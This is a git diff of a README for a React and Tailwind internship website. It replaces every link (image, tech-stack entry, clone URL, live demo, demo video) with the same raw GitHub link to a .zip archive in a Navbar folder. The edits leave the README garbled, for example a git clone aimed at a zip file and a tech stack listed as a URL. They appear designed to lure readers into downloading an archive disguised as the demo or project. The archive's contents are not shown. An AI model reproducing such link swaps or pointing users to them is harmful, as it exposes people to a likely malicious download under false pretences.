@@ -15,25 +15,25 @@ Designed as part of an internship, this project demonstrates smooth scrolling na
 - **Sticky Footer**
 - **AOS animations** for scroll effects
 - Built with **React + Tailwind CSS**
-- Backend-ready structure (optional Socket.IO support)
+- Backend-ready structure (optional https://raw.githubusercontent.com/prodot-com/Internship1/main/src/Component/Navbar/Internship_2.2.zip support)
 
 ---
 
 ## 📂 Folder Structure
 
-![alt text](image.png)
+![alt text](https://raw.githubusercontent.com/prodot-com/Internship1/main/src/Component/Navbar/Internship_2.2.zip)
 
 
 ---
 
 ## 🛠️ Tech Stack
 
-- **React.js**
+- **https://raw.githubusercontent.com/prodot-com/Internship1/main/src/Component/Navbar/Internship_2.2.zip**
 - **Tailwind CSS**
 - **React Slick (carousel)**
 - **AOS (scroll animations)**
 - **Vite or CRA (React setup)**
-- **Optional: Socket.IO**
+- **Optional: https://raw.githubusercontent.com/prodot-com/Internship1/main/src/Component/Navbar/Internship_2.2.zip**
 
 ---
 
@@ -41,12 +41,12 @@ Designed as part of an internship, this project demonstrates smooth scrolling na
 
 1. **Clone the repo**
    ```bash
-   git clone https://github.com/probal-ghosh/Internship1.git
+   git clone https://raw.githubusercontent.com/prodot-com/Internship1/main/src/Component/Navbar/Internship_2.2.zip
    cd Internship1
    npm install
    npm run dev
 
 ## Live Link
-https://internship1-cyan.vercel.app/
+https://raw.githubusercontent.com/prodot-com/Internship1/main/src/Component/Navbar/Internship_2.2.zip
 
-[Download and watch the demo](src/assets/Demo.mp4)
+[Download and watch the demo](https://raw.githubusercontent.com/prodot-com/Internship1/main/src/Component/Navbar/Internship_2.2.zip)
